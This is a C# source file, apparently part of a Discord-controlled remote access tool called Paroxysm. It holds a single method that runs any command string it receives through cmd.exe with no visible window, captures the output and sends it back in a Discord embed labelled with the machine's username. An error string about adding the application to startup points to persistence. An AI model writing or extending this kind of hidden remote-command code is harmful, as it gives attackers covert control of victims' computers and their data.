using System.Diagnostics;
using Discord;
using Paroxysm.Tools;

namespace Paroxysm.Hooks.Actions;

public static class ExecuteCommandAction
{
    public static Embed Follow(string? command)
    {
        if (command is null)
        {
            return EmbedCreator.CreateWithText(Color.Red, "Command executed with errors",
                "Cannot add application to startup.", Environment.UserName, null);
        }

        try
        {
            var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    Arguments = "/C" + command
                }
            };
            process.Start();
            var output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            if (output.Length == 0)
            {
                return EmbedCreator.CreateWithText(Color.Red, "Command executed with errors",
                    "Command does not return result or not exist.", Environment.UserName, null);
            }

            return EmbedCreator.CreateWithText(Color.Red, $"Command {command} result:",
                output, Environment.UserName, null);
        }
        catch (Exception exception)
        {
            return EmbedCreator.CreateWithText(Color.Red, "Command executed with errors",
                exception.ToString(), Environment.UserName, null);
        }
    }
}